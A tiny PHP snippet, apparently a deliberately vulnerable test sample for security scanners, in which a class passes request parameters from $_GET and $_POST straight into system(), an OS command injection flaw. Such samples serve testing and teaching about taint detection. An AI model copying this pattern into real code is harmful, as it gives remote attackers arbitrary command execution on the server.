<?php
// constructor wires a request value into an instance property used later
class Invoker {
    public function __construct($prefix) {
        $this->prefix = $prefix;
    }
    public function exec($remaining) {
        system($this->prefix . $remaining);
    }
}
$inv = new Invoker($_GET['pre']);
$inv->exec($_POST['suffix']);
